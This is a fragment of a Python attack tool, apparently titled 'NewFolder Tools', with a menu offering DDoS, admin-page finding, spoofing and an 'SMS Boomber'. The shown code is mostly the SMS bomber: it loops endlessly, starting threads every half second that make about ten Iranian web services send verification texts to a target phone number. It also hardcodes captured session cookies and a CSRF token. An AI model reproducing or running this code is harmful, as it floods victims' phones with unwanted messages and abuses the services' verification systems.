    gaD = f'_token=bBSxMx7ifcypKJuE8qQEhahIKpcVApWdfZXFkL8R&mobile={"0"+phone.split("+98")[1]}&recaptcha='
    gaU = 'https://www.mihanpezeshk.com/ConfirmCodeSbm_Patient'
    gaH = {'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
'accept-encoding': 'gzip, deflate, br',
'accept-language': 'en-US,en;q=0.9',
'cache-control': 'max-age=0',
'content-type': 'application/x-www-form-urlencoded',
'cookie': 'XSRF-TOKEN=eyJpdiI6IitzYVZRQzFLdGlKNHRHRjIxb3R4VWc9PSIsInZhbHVlIjoianR6SXBJXC9rUStMRCs0ajUzalNjM1pMN053bUNtSlJ5dzYrVzFxV1dtXC9SREp4OTJ0Wm1RWW9yRVwvM29Cc3l4SCIsIm1hYyI6IjdjODczZWI4Y2Q2N2NhODVkNjE5YTRkOWVhNjRhNDRlNmViZjhlNDVkNDYwODFkNzViOTU2ZTdjYTUwZjhjMWUifQ%3D%3D; laravel_session=eyJpdiI6ImU3dlpRdXV1XC9TMmJEWk1LMkFTZGJRPT0iLCJ2YWx1ZSI6IktHTWF0bFlJU0VqVCthamp5aW1GRHdBM1lNcjNMcVFxMWM5Ynd3clZLQzdva2ZJWXRiRU4xaUhyMnVHMG90RkUiLCJtYWMiOiJkZWRmMGM5YzFiNDNiOTJjYWFiZDc0MjYxMDUyMzBmYTMzMmI5ZTBkODA1YTMxODQyYzM2NjVjZWExZmYwMzdhIn0%3D',
'origin': 'https://www.mihanpezeshk.com',
'referer': 'https://www.mihanpezeshk.com/confirmcodePatient',
'upgrade-insecure-requests': '1',
'user-agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.45 Safari/537.36'}
    try:
        gaR = post(url=gaU, headers=gaH, data=gaD)
        print(f'{g}(MihanPezeshk) {w}Code Was Sent')
        return True
    except:
        pass
# ================================[SEND SMS FUNC]================================
def is_phone(phone: str):
    if match(r"(\+989|^989|09|9)[0-9]{9}", phone):
        return sub(r"(\+989|^989|09)", "+989", phone)
    return False
def Vip(phone, Time):
    while True:
        Thread(target=snap, args=[phone]).start(), sleep(Time)
        Thread(target=gap, args=[phone]).start(), sleep(Time)
        Thread(target=tap30, args=[phone]).start(), sleep(Time)
        Thread(target=divar, args=[phone]).start(), sleep(Time)
        Thread(target=torob, args=[phone]).start(), sleep(Time)
        Thread(target=snapfood, args=[phone]).start(), sleep(Time)
        Thread(target=alibaba, args=[phone]).start(), sleep(Time)
        Thread(target=smarket, args=[phone]).start(), sleep(Time)  
        Thread(target=seebirani, args=[phone]).start(), sleep(Time)
        Thread(target=mihanpezeshk, args=[phone]).start(), sleep(Time)
r='\033[1;31m'
g='\033[32;1m' 
y='\033[1;33m'
w='\033[1;37m'
def sms_boomber():
    texts = f"""

░██████╗███╗░░░███╗░██████╗  ██████╗░░█████╗░░█████╗░███╗░░░███╗██████╗░███████╗██████╗░
██╔════╝████╗░████║██╔════╝  ██╔══██╗██╔══██╗██╔══██╗████╗░████║██╔══██╗██╔════╝██╔══██╗
╚█████╗░██╔████╔██║╚█████╗░  ██████╦╝██║░░██║██║░░██║██╔████╔██║██████╦╝█████╗░░██████╔╝
░╚═══██╗██║╚██╔╝██║░╚═══██╗  ██╔══██╗██║░░██║██║░░██║██║╚██╔╝██║██╔══██╗██╔══╝░░██╔══██╗
██████╔╝██║░╚═╝░██║██████╔╝  ██████╦╝╚█████╔╝╚█████╔╝██║░╚═╝░██║██████╦╝███████╗██║░░██║
╚═════╝░╚═╝░░░░░╚═╝╚═════╝░  ╚═════╝░░╚════╝░░╚════╝░╚═╝░░░░░╚═╝╚═════╝░╚══════╝╚═╝░░╚═╝
{Fore.RED}> {Fore.WHITE} Version 1.0
{Fore.RED}> {Fore.WHITE} Created By NewFolder
"""
    phone = is_phone(input(f'{g}[?] {y}Enter Phone Number {g} {r}- {w}'))
    Time = 0.5
    Vip(phone, Time)
#------------------------
#-----------------
def startup():
        try:
            text = f"""
            ███╗░░██╗███████╗░██╗░░░░░░░██╗███████╗░█████╗░██╗░░░░░██████╗░███████╗██████╗░  ████████╗░█████╗░░█████╗░██╗░░░░░░██████╗
            ████╗░██║██╔════╝░██║░░██╗░░██║██╔════╝██╔══██╗██║░░░░░██╔══██╗██╔════╝██╔══██╗  ╚══██╔══╝██╔══██╗██╔══██╗██║░░░░░██╔════╝
            ██╔██╗██║█████╗░░░╚██╗████╗██╔╝█████╗░░██║░░██║██║░░░░░██║░░██║█████╗░░██████╔╝  ░░░██║░░░██║░░██║██║░░██║██║░░░░░╚█████╗░
            ██║╚████║██╔══╝░░░░████╔═████║░██╔══╝░░██║░░██║██║░░░░░██║░░██║██╔══╝░░██╔══██╗  ░░░██║░░░██║░░██║██║░░██║██║░░░░░░╚═══██╗
            ██║░╚███║███████╗░░╚██╔╝░╚██╔╝░██║░░░░░╚█████╔╝███████╗██████╔╝███████╗██║░░██║  ░░░██║░░░╚█████╔╝╚█████╔╝███████╗██████╔╝
            ╚═╝░░╚══╝╚══════╝░░░╚═╝░░░╚═╝░░╚═╝░░░░░░╚════╝░╚══════╝╚═════╝░╚══════╝╚═╝░░╚═╝  ░░░╚═╝░░░░╚════╝░░╚════╝░╚══════╝╚═════╝░
            {Fore.RED}>  [1] : {Fore.RESET} DDOS
            {Fore.RED}>  [2] : {Fore.RESET} Admin Finder 
            {Fore.RED}>  [3] : {Fore.RESET} Spoofer (Need To Run As Administrator)
            {Fore.RED}>  [4] : {Fore.RESET} Sms Boomber
            {Fore.RED}>  [5] : {Fore.RESET} Exit 
            """
            print(text)
            selection = input(f"{Fore.GREEN}Enter The Number >  {Fore.RESET}")
            if int(selection) == 1 :
                DDOS()
            elif int(selection) == 2:
                admin_finder()
            elif int(selection) == 3:
                spoofer()
            elif int(selection) == 4:
                sms_boomber()
            elif int(selection) == 5:
                exit()
            else:
                print(f"{Fore.RED}[Error] > {Fore.WHITE} Value Incorrect {Fore.RESET}")
                print(f"{Fore.BLUE}[Information] > {Fore.WHITE} Close In 3 Sec..")
                time.sleep(3)
                exit()
        except requests.exceptions.RequestException:
            vpn = f"""
                ███╗░░██╗███████╗░██╗░░░░░░░██╗███████╗░█████╗░██╗░░░░░██████╗░███████╗██████╗░  ████████╗░█████╗░░█████╗░██╗░░░░░░██████╗
                ████╗░██║██╔════╝░██║░░██╗░░██║██╔════╝██╔══██╗██║░░░░░██╔══██╗██╔════╝██╔══██╗  ╚══██╔══╝██╔══██╗██╔══██╗██║░░░░░██╔════╝
                ██╔██╗██║█████╗░░░╚██╗████╗██╔╝█████╗░░██║░░██║██║░░░░░██║░░██║█████╗░░██████╔╝  ░░░██║░░░██║░░██║██║░░██║██║░░░░░╚█████╗░
                ██║╚████║██╔══╝░░░░████╔═████║░██╔══╝░░██║░░██║██║░░░░░██║░░██║██╔══╝░░██╔══██╗  ░░░██║░░░██║░░██║██║░░██║██║░░░░░░╚═══██╗
                ██║░╚███║███████╗░░╚██╔╝░╚██╔╝░██║░░░░░╚█████╔╝███████╗██████╔╝███████╗██║░░██║  ░░░██║░░░╚█████╔╝╚█████╔╝███████╗██████╔╝
                ╚═╝░░╚══╝╚══════╝░░░╚═╝░░░╚═╝░░╚═╝░░░░░░╚════╝░╚══════╝╚═════╝░╚══════╝╚═╝░░╚═╝  ░░░╚═╝░░░░╚════╝░░╚════╝░╚══════╝╚═════╝░

                {Fore.RED}[Error] > {Fore.RESET}Please Enable VPN.
                {Fore.BLUE}[Infromation] > {Fore.RESET}Exiting ...
                """
            print(vpn)
            time.sleep(4)
            exit()
    #---------------------------------------------------
startup()
